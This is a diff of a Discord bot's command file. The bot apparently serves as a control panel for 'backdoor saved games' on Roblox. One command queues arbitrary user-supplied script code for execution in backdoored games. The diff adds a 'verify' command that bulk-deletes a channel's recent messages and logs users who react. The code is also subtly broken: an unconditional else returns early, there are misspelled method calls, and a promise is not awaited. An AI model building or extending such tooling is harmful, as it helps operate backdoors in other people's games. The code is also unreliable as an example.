@@ -1,6 +1,6 @@
-import { SlashCommandBuilder, EmbedBuilder, Embed, CategoryChannel, ButtonBuilder} from "discord.js";
+import { SlashCommandBuilder, EmbedBuilder, Embed, CategoryChannel, ButtonBuilder, IntegrationExpireBehavior, verifyString, Events} from "discord.js";
 import axios from 'axios';
-import {storage} from './storageExpress.js';
+import { ExpressStorage } from './storageExpress.js';
 
 const commands = [
     {
@@ -98,7 +98,7 @@ const commands = [
             if (!scriptCode || !placeId) 
                 {
                     return(interaction.reply('make you sure you inputed the correct script & placeid'))
-                } else if (!storage.savedGames[String(placeId)]) {
+                } else if (!ExpressStorage.savedGames[String(placeId)]) {
                     return(interaction.reply('The game is not found in backdoor saved games.'));
                 } else {return(interaction.reply('Something went wrong idk!'))};
 
@@ -123,14 +123,14 @@ const commands = [
                 const gameImagedata = await gameImageResponse.data.data[0];
                 const gameImageUrl = await gameImagedata.imageUrl ? gameImagedata.imageUrl : 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcThxpwPKHBP41r-01lGuLh4YE2Q7rG4EUv13A&s.png'
 
-                if (storage.savedGames[String(placeId)] && storage.savedGames[String(placeId)].executedCommands) {
-                    storage.savedGames[String(placeId)].executedCommands.push({
+                if (ExpressStorage.savedGames[String(placeId)] && ExpressStorage.savedGames[String(placeId)].executedCommands) {
+                    ExpressStorage.savedGames[String(placeId)].executedCommands.push({
                         placeId: placeId,
                         Source : scriptCode,
                     });
                 };
 
-                console.log(storage.savedGames);
+                console.log(ExpressStorage.savedGames);
 
                 const Embed = new EmbedBuilder()
                 .setTitle(`# **ExecutingScript: ${scriptCode}**`)
@@ -182,6 +182,68 @@ const commands = [
                 
             } catch(e) {
                 interaction.reply(e.message);
+            };
+        },
+    },
+    {
+        name: 'reacttoacces',
+
+        data: new SlashCommandBuilder()
+        .setName('reacttoacces')
+        .setDescription('Create react accesing to the server!')
+        .addStringOption(option => {
+            option.setName('reaction')
+        }).toJSON(),
+
+        async execute() {
+            const args = arguments;
+            const interaction = args[0];
+            const client = args[1];
+
+            const getReaction = interaction.options.getString('reaction');
+            if (!getReaction) {
+                interaction.reply('Message did not found');
+
+                setTimeout(() => {
+                    interaction.deletereply();
+                }, 3000);
+
+                return;
+            };
+
+            try {
+
+                const verifiyEmbed = new EmbedBuilder()
+                .setTitle('Verify To Acces')
+                .setDescription('Click to get verified')
+                .setColor(0x0099ff)
+                .setFooter({
+                    text: `Verify - ${client.user.username}`,
+                })
+                .setTimestamp(new Date())
+
+                const channel = await interaction.channel;
+                await channel.bulkDelete(100, true);
+
+                const newMessage = channel.send({
+                    embeds: [verifiyEmbed],
+                });
+
+                await newMessage.react(getReaction);
+
+                client.on(Events.MessageReactionAdd, async (reaction, user) => {
+                    if (!user.bot) {
+                        console.log(user.tag, 'reacted')
+                    } else {
+                        console.log('Bot detected')
+                    };
+                });
+
+            } catch(e) {
+                interaction.reply(e.message);
+                setTimeout(() => {
+                    interaction.deletereply();
+                }, 3000);
             };
         },
     },
